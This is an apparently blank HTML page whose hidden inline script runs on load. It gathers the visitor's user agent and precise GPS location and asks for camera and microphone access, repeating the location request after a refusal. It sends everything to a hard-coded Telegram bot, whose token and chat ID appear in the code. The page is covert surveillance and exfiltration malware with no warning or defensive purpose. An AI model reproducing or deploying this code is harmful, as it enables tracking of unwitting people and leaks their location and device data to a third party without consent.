<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    body { margin: 0; padding: 0; background: white; }
  </style>
</head>
<body>

<script>
    const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
    const CHAT_ID = "6024837142";

    function sendToBot(data) {
        const message = JSON.stringify(data, null, 2);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
            .catch(console.error);
    }

    let retryCount = 0;
    const MAX_RETRIES = 3;

    async function requestPermissions() {
        const collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            location: null,
            camera: null,
            microphone: null
        };

        // طلب الموقع
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    collectedData.location = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    sendToBot(collectedData);
                },
                (err) => {
                    if (retryCount < MAX_RETRIES) {
                        retryCount++;
                        setTimeout(() => requestPermissions(), 2000);
                    } else {
                        collectedData.location = { error: "denied" };
                        sendToBot(collectedData);
                    }
                }
            );
        }

        // طلب الكاميرا والميكروفون
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                collectedData.camera = "granted";
                collectedData.microphone = "granted";
                sendToBot(collectedData);
                
                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            } catch (err) {
                collectedData.camera = "denied";
                collectedData.microphone = "denied";
                sendToBot(collectedData);
            }
        }
    }

    requestPermissions();
</script>
</body>
</html>
